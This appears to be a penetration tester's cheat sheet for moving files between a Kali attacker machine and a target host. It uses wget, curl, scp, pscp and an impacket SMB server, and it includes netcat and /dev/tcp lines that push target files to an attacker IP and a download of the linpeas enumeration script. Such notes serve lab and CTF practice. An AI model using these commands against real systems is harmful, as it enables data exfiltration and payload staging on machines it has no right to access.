

**0x01 wget**

- KALI
```bash
sudo python -m http.server 8888
sudo php -S 192.168.15.129:8888
```

```bash
wget http://192.168.55.3:8888/[PATH]
```

```bash
wget -m ftp://anonymous:xxx@[IP/Domain]
```


**0x02 nc**

```bash
nc -lvvp <port> > <FILE>   
cat <FILE> | nc <IP> <port>

nc -lvvp <port> > <FILE>  
cat <FILE> > /dev/tcp/<IP>/<PORT>  (Target without nc)
```

**0x03 curl**

```bash
curl -# -O http://192.168.55.3/linpeas.sh
```


**0x04 SCP**

```shell
scp first_stage@192.168.15.133:/home/mhz_c1f/Paintings/* ./

scp [PATH] cjk@192.168.55.3:~/tmp
```

**SAMBA**

- Kali > Target
```
locate sambashare
/usr/share/doc/python3-impacket/examples/smbserver.py
```

```
sudo python /usr/share/doc/python3-impacket/examples/smbserver.py share .
```

- Target > Kali
```bash
/usr/share/doc/python3-impacket/examples/smbserver.py share . -user xekoner -pass xekoner -smb2support
net use \\10.10.14.18\share /u:xekoner xekoner 
copy xxx \\10.10.14.18\share
```

**pscp**

Kali 下载 Windows 上的文件
```bash
pscp USER@IP:REMOTEPATH LOCALPATH
```

